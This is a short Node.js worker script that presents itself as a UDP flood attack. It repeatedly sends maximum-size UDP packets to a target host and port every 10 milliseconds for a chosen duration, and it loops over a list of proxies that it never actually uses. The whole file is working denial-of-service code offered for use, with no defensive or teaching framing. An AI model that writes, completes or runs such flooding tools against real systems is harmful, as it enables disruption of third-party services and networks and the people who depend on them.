import { Worker, workerData, parentPort } from "worker_threads";
import dgram from "dgram";

// Worker thread to perform UDP flood attack
const udpSocket = dgram.createSocket("udp4");
let attackStarted = false;
let attackDuration = 0;
let packetSize = 65507; // Max UDP packet size (65507 bytes)

// Send UDP packets
function sendPackets(targetHost, targetPort, proxies, duration, packetSize) {
  const message = Buffer.alloc(packetSize, "A"); // Fill with "A" for payload
  
  const interval = setInterval(() => {
    proxies.forEach((proxy) => {
      udpSocket.send(
        message,
        0,
        message.length,
        targetPort,
        targetHost,
        (err) => {
          if (err) console.error("UDP send error:", err);
        }
      );
    });
  }, 10); // Send packets every 10 ms

  setTimeout(() => {
    clearInterval(interval);
    udpSocket.close();
    console.log("UDP flood attack completed");
  }, duration * 1000);
}

// Main function
const { target, proxies, duration, packetDelay, targetPort } = workerData;
attackDuration = duration;
sendPackets(target, targetPort, proxies, attackDuration, packetSize);

// Send message back to main thread
parentPort.postMessage({ status: "started", duration: attackDuration });
